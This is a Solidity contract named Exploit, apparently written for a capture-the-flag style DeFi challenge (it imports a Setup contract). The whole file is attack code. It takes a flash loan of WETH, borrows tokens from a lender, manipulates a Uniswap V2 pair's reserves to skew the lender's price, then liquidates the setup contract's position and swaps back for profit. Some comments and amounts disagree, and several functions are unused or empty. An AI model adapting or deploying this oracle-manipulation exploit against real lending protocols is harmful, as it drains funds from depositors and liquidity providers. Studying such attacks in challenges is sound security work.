// SPDX-License-Identifier: private

pragma solidity 0.8.0;

import "./Setup.sol";

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract Exploit {
    // AMM model of k = a * b
    IUniswapV2Pair public pair;
    // a reference to the lender
    Lender public lender;
    // the 2 specific tokens involved
    Token public token;
    WETH9 public weth;
    // flash loan provider
    FlashLoan public flashloanPool;
    // a reference to setup contract
    Setup public setup;
    IUniswapV2Router02 public constant router = IUniswapV2Router02(0xC1412878fA9Bab4619029B18504fe23AC3d21B42);
    uint256 constant DECIMALS = 1 ether;
    uint256 public constant loanAmount = 1000 ether;
    uint256 public constant collateralAmount = 50 ether;
    uint256 public constant swapAmount = loanAmount-collateralAmount;


    // we initialize all previous variables in the constructor
    // based on our development environment data
    constructor(Setup _setup) {
        // 1 extract from existing Setup contract all available data to be in sync
        setup = _setup;
        weth = setup.weth();
        //factory = setup.factory();
        token = setup.token();
        pair = setup.pair();
        lender = setup.lender();
        flashloanPool = setup.flashloanPool();
        // now request a flash loan an borrow some third party weth
        // after requesting flashloan a max of 1000 weth will be transfered to this exploit balance
        // and callback method receiveFlashLoan(uint256) will be executed
        // ** receiveFlashLoan is called **/
    }

    function attack() public {
        flashloanPool.flashLoan(loanAmount);
    }

    function receiveFlashLoan(uint256 amount) public {
        manualAttack();
        // return the loan
        weth.transfer(address(flashloanPool), amount);
    }

    function manualAttack() public {
        step2();
        step3();
        step4();
        step5();
        step6();
        step7();
        step8();
    }

    function step1() public payable {
        // 1 get some weth
        require(msg.value==loanAmount);
        weth.deposit{value: loanAmount}();
    }

    function step2() public {
        // 2 approve
        uint256 maxAmount = type(uint256).max;
        
        // transfer weth to this contract
        weth.approve(address(this), maxAmount);
        weth.approve(address(pair), maxAmount);
        weth.approve(address(lender), maxAmount);

        token.approve(address(this), maxAmount);
        token.approve(address(lender), maxAmount);
        token.approve(address(lender), maxAmount);

        lender.deposit(collateralAmount);
        lender.borrow(250_000 * DECIMALS);
    }

    function step3() public {
        // send borrowed tokens to the pair
        // if we dont, we will end up with them for nothing
        //uint256 tokenBalance = token.balanceOf(address(this));
        //require( token.transferFrom(address(this), address(pair), tokenBalance), "transferFrom failed");
        // 3 transfer weth to the pair
        require(swapAmount > 0, "no weth on contract to swap");
        require( weth.transferFrom(address(this), address(pair), swapAmount), "transferFrom failed");
    }

    function step4() public {
        // 4 do swap
        require(swapAmount > 0, "no weth on contract to swap");
        // we get 375K in exchange
        // initial pool balance: 950+25 eth
        // 750k tokens = 500 + 250
        pair.swap(475_000 ether, 0, address(this), '');
    }  
    
    function step5() public {
        lender.repay(250_000 * DECIMALS);
    }
    function step6() public {
        lender.withdraw(collateralAmount);
    }

    function step7() public {
        // 25 is the multiplier
        lender.liquidate(address(setup), 25*25 ether);
    }

    function step8() public {
        // swap tokens back
        uint256 tokenBalance = token.balanceOf(address(this));
        require( token.transferFrom(address(this), address(pair), tokenBalance), "transferFrom failed");
        pair.swap(0, 925 ether, address(this), '');
    }

    function viewRate() public view returns (uint256) {
        return lender.rate();
    }

    function lenderBalance() public view returns (uint256) {
        return weth.balanceOf(address(lender));
    }

    function viewReserves() public view returns(uint112, uint112){
        (uint112 _reserve0, uint112 _reserve1, ) = pair.getReserves();
        return (_reserve0, _reserve1);
    }

    function thisBalance() public view returns(uint256, uint256){
        uint256 balance0 = token.balanceOf(address(this));
        uint256 balance1 = weth.balanceOf(address(this));
        return (balance0, balance1);
    }

    function pairBalance() public view returns(uint256, uint256){
        uint256 balance0 = token.balanceOf(address(pair));
        uint256 balance1 = weth.balanceOf(address(pair));
        return (balance0, balance1);
    }

    function senderBalance() public view returns(uint256, uint256){
        uint256 balance0 = token.balanceOf(msg.sender);
        uint256 balance1 = weth.balanceOf(msg.sender);
        return (balance0, balance1);
    }

    function runExploit(uint256 amount) internal {
    }

}
